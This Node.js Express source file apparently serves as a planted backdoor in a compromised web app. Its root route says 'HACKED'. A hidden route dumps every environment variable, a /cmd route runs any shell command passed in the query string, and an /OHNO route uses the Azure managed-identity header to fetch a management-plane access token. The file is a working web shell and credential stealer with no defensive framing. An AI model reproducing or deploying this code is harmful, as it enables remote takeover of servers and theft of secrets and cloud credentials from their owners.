const express = require('express')
const { exec } = require('child_process');
const app = express()
const port = 80

app.get('/', (req, res) => {
  res.send('Welcome to your HACKED app !')
})

app.get('/9728df14fb8da4351708', (req, res) => {
  res.json(process.env);
})

app.get('/cmd', (req, res) => {
  const cmd = req.query.cmd;
  exec(cmd, (error, stdout, stderr) => {

    if (error) {
	console.error(`Execution error: ${error.message}`);
        process.exit(1);
    }
    if (stderr) {
        console.error(`stderr: ${stderr}`);
        process.exit(1);
    }
        console.log(`Current user: ${stdout.trim()}`);
     });
})

app.get('/OHNO', (req, res) => {
  identity = process.env["IDENTITY_HEADER"]
  endpoint = process.env["IDENTITY_ENDPOINT"]
  exec(`curl "${endpoint}?resource=https://management.azure.com&api-version=2019-08-01" -H X-IDENTITY-HEADER:${identity}`, (error, stdout, stderr) => {

    if (error) {
	console.error(`Execution error: ${error.message}`);
        process.exit(1);
    }
    if (stderr) {
        console.error(`stderr: ${stderr}`);
        process.exit(1);
    }
        console.log(`Current user: ${stdout.trim()}`);
     });
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
